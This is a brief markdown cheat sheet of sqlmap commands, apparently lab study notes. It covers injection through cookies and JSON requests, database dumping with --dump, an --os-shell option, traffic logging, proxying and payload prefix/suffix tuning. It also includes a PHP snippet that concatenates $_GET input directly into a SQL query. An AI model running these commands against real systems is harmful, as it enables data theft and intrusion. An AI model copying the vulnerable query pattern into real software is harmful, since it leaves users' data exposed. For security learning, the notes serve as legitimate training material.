

# INJECTION METHODS


-  SQL INJECTION IN COOKIE

```
sqlmap -u "http://94.237.53.53:33035/case3.php" --batch --dump --cookie="id=1*"
```

-  SQL INJECTION IN JSON DATA

```
sqlmap -r req.txt --dump --os-shell
```

# Handling SQLMap Errors

- Display Errors

```
--parse-errors
```

show error in output

- Store the Traffic

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```
stores traffic in traffic.txt

- Verbose Output

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

- Using Proxy

```
--proxy=http://127.0.0.1:8080
```

# Attack Tuning

- adding prefix and suffix to the payload
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

works perfectly in this situation

- Level/Risk

```
- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
    
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
```



